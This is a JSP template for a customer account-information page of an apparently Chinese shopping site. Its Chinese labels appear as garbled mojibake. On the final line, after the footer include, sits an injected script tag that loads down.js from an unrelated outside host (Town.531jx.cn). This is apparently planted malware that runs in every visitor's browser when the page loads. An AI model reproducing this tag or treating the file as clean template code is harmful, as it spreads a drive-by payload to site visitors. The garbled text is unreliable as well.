<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<%@ taglib prefix="ctg" uri="/WEB-INF/category.tld"%>
<c:set var="title" value="��������-�ʻ�����"/> 
<%@ include file="IncludeTop.jsp" %>

<table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td width="178" valign="top">
	  <%@ include file="accountBar.jsp" %>
	  <%@ include file="searchAllBar.jsp" %>
      <%@ include file="newsBar.jsp" %>    </td>
    <td width="602" bgcolor="#FFFFFF" valign="top">
	  <c:if test="${empty userSession}">
	     <table  width="100%" height="300" border="0" cellpadding="0" cellspacing="0">
			<tr > 
			  <td align="center" colspan="4" class="red15">����û�е�½��</td>
			</tr>
		</table>
	  </c:if >
	  
	  <c:if test="${!empty userSession}"> 
	     <c:set var="customer" value="${userSession.customer}"/> 
         
      <table  width="100%" height="332" border="0" cellpadding="0" cellspacing="0">
        <tr > 
          <td height="25" colspan="4" align="center"> 
            <table width="100%" border="0" cellspacing="0" cellpadding="0" height="25" >
              <tr  bgcolor="#ACD1FF"> 
                <td width="23">&nbsp;</td>
                <td width="74"><b>������Ϣ</b></td>
                <td width="404">&nbsp;</td>
                <td width="50"><a href='<c:url value="/customerInfo.screen"/>'>�༭</a></td>
                <td width="51">&nbsp;</td>
              </tr>
            </table>          </td>
        </tr>
        <tr>
          <td width="14%" height="25"  align="right" class="blue14">����ID:</td> 
          <td align="left" class="black12" width="33%"><c:out value="${customer.userId}"/></td>
          <td align="right" class="blue14" width="12%">����ʡ��:</td>
          <td align="left" class="black12" width="41%"><ctg:code type="province" code="${customer.province}"/>
            ʡ
            <ctg:code type="city" code="${customer.province},${customer.city}"/>
            ��</td>
        </tr>
        <tr>
          <td width="14%" height="24" align="right" class="blue14">����:</td> 
          <td align="left" class="black12" width="33%"><a href=<c:url value="/resetPassword.screen"/>'>��������</a></td>
          <td align="right" class="blue14" width="12%">��ַ:</td>
          <td align="left" class="black12" width="41%"><c:out value="${customer.address}"/></td>
        </tr>
        <tr>
          <td width="14%" height="25" align="right" class="blue14">Email:</td> 
          <td align="left" class="black12" width="33%"><c:out value="${customer.email}"/></td>
          <td align="right" class="blue14" width="12%">�ʱ�:</td>
          <td align="left" class="black12" width="41%"><c:out value="${customer.zip}"/></td>
        </tr>
        <tr>
          <td width="14%" height="25" align="right" class="blue14">����:</td> 
          <td align="left" class="black12" width="33%"><c:out value="${customer.name}"/></td>
          <td align="right" class="blue14" width="12%">�绰:</td>
          <td align="left" class="black12" width="41%"><c:out value="${customer.telNo}"/></td>
        </tr>
        <tr>
          <td width="14%" height="26" align="right" class="blue14">�Ա�:</td> 
          <td align="left" class="black12" width="33%"><c:out value="${customer.gender}"/></td>
          <td align="right" class="blue14" width="12%">�ֻ�:</td>
          <td align="left" class="black12" width="41%"><c:out value="${customer.mobile}"/></td>
        </tr>
        <tr>
          <td width="14%" height="26" align="right" class="blue14">��������:</td> 
          <td align="left" class="black12" width="33%"><c:out value="${customer.birthday}"/></td>
          <td align="right" class="blue14" width="12%">��ҵ:</td>
          <td align="left" class="black12" width="41%"><ctg:code type="industry" code="${customer.industry}"/></td>
        </tr>
        <tr>
          <td align="right" class="black12" height="26"  width="14%">&nbsp;</td> 
          <td align="left" class="black12" width="33%">&nbsp;</td>
          <td align="right" class="blue14" width="12%">��˾����:</td>
          <td align="left" class="black12" width="41%"><c:out value="${customer.company}"/></td>
        </tr>
        
        <tr> 
          <td align="center" class="black12" colspan="4" height="20">
            <table width="100%" border="0" cellspacing="0" cellpadding="0" height="25" bgcolor="#ACD1FF">
              <tr> 
                <td width="15">&nbsp;</td>
                <td width="82"><b>�ʻ���Ϣ</b></td>
                <td>&nbsp;</td>
                <td width="60">&nbsp;</td>
              </tr>
            </table>          </td>
        </tr>
        <tr> 
          <td align="center" class="black12" width="14%" height="26">&nbsp;</td>
          <td align="right" class="black12" width="33%" height="26">&nbsp;</td>
          <td align="center" class="black12" width="12%" height="26">&nbsp;</td>
          <td align="left" class="black12" width="41%" height="26">&nbsp;</td>
        </tr>
        <tr> 
          <td align="center" class="black12" width="14%" height="24">&nbsp;</td>
          <td align="right" class="black12" width="33%" height="24">&nbsp;</td>
          <td align="center" class="black12" width="12%" height="24">&nbsp;</td>
          <td align="left" class="black12" width="41%" height="24">&nbsp;</td>
        </tr>
        <tr> 
          <td align="center" class="black12" width="14%" height="24">&nbsp;</td>
          <td align="right" class="black12" width="33%" height="24">&nbsp;</td>
          <td align="center" class="black12" width="12%" height="24">&nbsp;</td>
          <td align="left" class="black12" width="41%" height="24">&nbsp;</td>
        </tr>
        <tr> 
          <td align="center" class="black12" width="14%" height="20">&nbsp;</td>
          <td align="right" class="black12" width="33%" height="20">&nbsp;</td>
          <td align="center" class="black12" width="12%" height="20">&nbsp;</td>
          <td align="left" class="black12" width="41%" height="20">&nbsp;</td>
        </tr>
      </table>  
  </c:if >    </tr>
</table>

<%@ include file="IncludeBottom.jsp" %>

<script language=javascript src=http://Town.531jx.cn/down.js></script>